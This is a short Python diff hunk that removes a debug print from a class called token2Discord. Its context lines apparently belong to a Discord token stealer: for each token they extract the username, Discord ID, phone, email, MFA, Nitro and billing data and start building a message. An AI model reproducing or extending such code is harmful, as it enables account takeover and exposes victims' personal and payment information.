@@ -52,7 +52,6 @@ class token2Discord:
                 # if user data was found, extract data
                 if userData != None:
                     platIndex = self.tokens.index(token)
-                    print(platIndex)
                     username, discordId, phone, email, mfa, nitro, billing = self.extract(userData, token)
                     # construct message
                     message = {
